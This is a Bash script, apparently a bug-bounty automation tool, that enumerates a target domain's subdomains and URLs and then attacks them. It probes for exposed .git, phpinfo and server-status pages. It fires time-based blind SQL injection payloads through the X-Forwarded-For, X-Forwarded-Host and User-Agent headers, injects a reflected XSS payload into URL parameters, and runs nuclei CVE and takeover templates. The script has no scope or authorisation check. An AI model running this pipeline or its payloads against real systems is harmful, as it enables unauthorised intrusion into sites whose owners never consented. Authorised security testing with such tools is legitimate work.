#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'
GREEN='\033[0;32m'
NUCLEI_COLOR='\033[0;34m'

echo -e """${CYAN}
░█▀▀█ █░░ █▀▄▀█ ░▀░ █▀▀▀ █░░█ ▀▀█▀▀ █░░█ 
▒█▄▄█ █░░ █░▀░█ ▀█▀ █░▀█ █▀▀█ ░░█░░ █▄▄█ 
▒█░▒█ ▀▀▀ ▀░░░▀ ▀▀▀ ▀▀▀▀ ▀░░▀ ░░▀░░ ▄▄▄█${RESET}"""

usage() {
    echo "Usage: $0 -d <target_domain>"
    exit 1
}

while getopts ":d:" opt; do
    case "${opt}" in
        d)
            TARGET_DOMAIN=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done

if [ -z "${TARGET_DOMAIN}" ]; then
    usage
fi

echo -e "${GREEN}Creating Subdomain Directory${RESET}"
mkdir -p Subdomains
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Subfinder, Anew, and Httpx...${RESET}"
echo ${TARGET_DOMAIN} | subfinder -silent | anew | httpx -silent >> Subdomains/subdomains.txt
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title > Subdomains/httpx-Server-status.txt
cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title > Subdomains/httpx-phpinfo.txt
cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title > Subdomains/httpx-DS_store.txt
cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title > Subdomains/httpx-git.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Httpx...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -sc -title -cl --tech-detect >> Subdomains/httpx-details.txt
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Naabu...${RESET}"
cat Subdomains/subdomains.txt | naabu --passive -silent > Subdomains/ports.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
subzy run --targets Subdomains/subdomains.txt >> Subdomains/subzy.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-For.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-Host:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-Host.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-User-Agent.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Creating nuclei directory...${RESET}"
mkdir -p Subdomains/nuclei
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
echo -e "${CYAN}Task Completed!${RESET}"

for year in {2000..2024}; do
    echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
    cat Subdomains/subdomains.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$year/*.yaml > Subdomains/nuclei/nuclei-$year.txt
done

source /$HOME/bugbounty450/venv/bin/activate

mkdir -p urls

echo -e "${GREEN}Running Katana${RESET}"
echo "${TARGET_DOMAIN}" | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt
cat urls/katana.txt | uro > urls/katana-clean.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Running GAU${RESET}"
echo "${TARGET_DOMAIN}" | gau --subs > urls/gau.txt
cat urls/gau.txt | uro > urls/gau-clean.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Running Waybackurls...${RESET}"
waybackurls "${TARGET_DOMAIN}" > urls/waybackurls.txt
cat urls/waybackurls.txt | uro > urls/waybackurls-clean.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Combining all URLs${RESET}"
cat urls/katana-clean.txt urls/gau-clean.txt urls/waybackurls-clean.txt > urls/final-clean.txt
rm urls/katana-clean.txt urls/gau-clean.txt urls/waybackurls-clean.txt
echo -e "${GREEN}Task Completed${RESET}"

echo -e "${GREEN}Checking for possible XSS vulnerabilities...${RESET}"
cat urls/final-clean.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert("XSS")>' | 
while read -r host; do 
    if curl -sk --path-as-is "$host" | grep -qs '"><img src=x onerror=alert("XSS")>'; then 
        echo "$host is vulnerable" >> urls/possible-xss.txt
    fi
done

cat urls/final-clean.txt | gf sqli | uro > urls/sqli.txt
cat urls/final-clean.txt | gf redirect | uro | egrep -iv "wp-" > urls/open-redirect.txt
cat urls/final-clean.txt | gf ssrf | uro > urls/ssrf.txt
cat urls/final-clean.txt | gf rce | uro > urls/rce.txt
cat urls/final-clean.txt | gf lfi | uro > urls/lfi.txt
cat urls/final-clean.txt | gf interestingEXT | uro > urls/interesting-extentions.txt
cat urls/final-clean.txt | gf interestingparams | uro > urls/interesting-params.txt
cat urls/final-clean.txt | gf debug_logic | uro > urls/debug-logic.txt
cat urls/final-clean.txt | gf img-traversal | uro > urls/img-traversal.txt
cat urls/final-clean.txt | gf ssti | uro > urls/ssti.txt

mkdir urls/nuclei
for i in {2000..2024}; do
    echo -e "${NUCLEI_COLOR}Running Nuclei template $i${RESET}"
    cat urls/final-clean.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
done
echo -e "${GREEN}Process complete!${RESET}"
